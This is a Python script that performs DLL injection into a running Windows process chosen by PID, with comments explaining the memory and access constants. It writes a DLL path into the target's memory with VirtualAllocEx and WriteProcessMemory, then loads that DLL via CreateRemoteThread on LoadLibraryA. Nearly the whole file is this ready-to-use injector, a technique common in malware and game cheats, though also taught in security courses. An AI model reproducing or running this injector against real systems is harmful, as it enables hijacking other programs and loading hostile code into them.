import sys
import os
import ctypes
from ctypes import wintypes
from ctypes import *

#Windows Constants
"""
Please note that DEP will most likely prevent this kind of attack

PAGE_READWRITE = 0x04 : This is a standard memory protection used with VirtualAllocEx. It gives us Read and Write permissions in an assingned memory space but not execution.

MEM_COMMIT | MEM_RESERVE = Used with VirtualAllocEx to reserve an address range and commit physical memory in a single call. 0x1000 represents MEM_COMMIT and 0x2000 represents MEM_RESERVE.
                           When used with | (bitwise OR) it results in hexadecimal 0x3000 which is MEM_COMMIT | MEM_RESERVE

PROCESS_ALL_ACCESS = Grants access rights! 
                     0x000F0000 being STANDARD_RIGHTS_REQUIRED like WO(write owner), WD(Write DACL), RC (Read Control) and DE (DELETE) of ACCESS_MASK(DWORD data type that defines standard, specific, and generic rights)
                     0x00100000 being SYNCHRONIZE which is used to Synchronize the ACCESS_MASK
                     0xFFF being PROCESS_ALL_ACCESS which grants All possible access rights for a process.
"""
PAGE_READWRITE = 0x04
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
kernel32 = ctypes.windll.kernel32

#get user input while also ensuring the PID is an int value
def get_user_int(prompt):
    global pid
    global ddl_path
    while True:
        try:
            user_input = input(prompt)
            get_user_int = int(user_input)
            return get_user_int
        except ValueError:
            print("[!] Invalid input")

pid = get_user_int("[>] Please provide the Process PID you wish to inject to: ")
dll_path = input("[>] Please provide the path to your DLL!!!\n[>] Format Example(C:\\path\\to\\your.dll): ")

#You can change the encoding here. For example swap to ASCII
encoding = 'utf-8'

#DLL loaded as a ctype for easier payload delivery
buffer = ctypes.create_string_buffer(dll_path.encode(encoding))

if pid is not None:
    print(f"[>] PID captured as {pid}")  
if dll_path is not None:
    print(f"[>] Path to DLL captured as {dll_path}")
    print(f"[>] Information: {buffer}")

#where the actual injection code is
def inject_dll(pid, buffer):

#Open host process 
    host_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, (pid))
    if not host_process:
        print(f"[!] Failed to open process {pid}")
        sys.exit(0)
#Allocate memory in the host process with the rights mentioned above for the Dll path        
    arg_address = kernel32.VirtualAllocEx(
        host_process, 
        0, 
        ctypes.sizeof(buffer), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    )
#Write the Dll Path into allocated memory
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        host_process, 
        arg_address, 
        buffer, 
        ctypes.sizeof(buffer), 
        ctypes.byref(written)
    )
#Get address of LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

#Create remote thread and if it fails print the error   
    thread_id = wintypes.DWORD(0)
    hThread = kernel32.CreateRemoteThread(
        host_process, 
        None, 
        0, 
        h_loadlib, 
        arg_address, 
        0, 
        byref(thread_id)
    )
    if not hThread:
        print(f"[!] Failed remote thread: {kernel32.GetLastError()}")
        return False
    else:
        print(f"[>] DLL injected successfully into PID {pid}") 
        print(f"[>] Remote Thread Creation Successful!\n[>] REMOTE THREAD ID: {thread_id.value}")
        return True

   
    

if __name__ == "__main__":
    if os.path.exists(dll_path):
        inject_dll(pid, buffer)
    else:
        print("[!] DLL file not found")     

while True:
    exit_input = input("[>] Please Enter 'exit' to stop): ")
    if exit_input.lower() == "exit":
         print("[>] Exiting Program")
         break
         sys.exit(0)
    else:
         print("[>] Please enter 'exit' to stop")



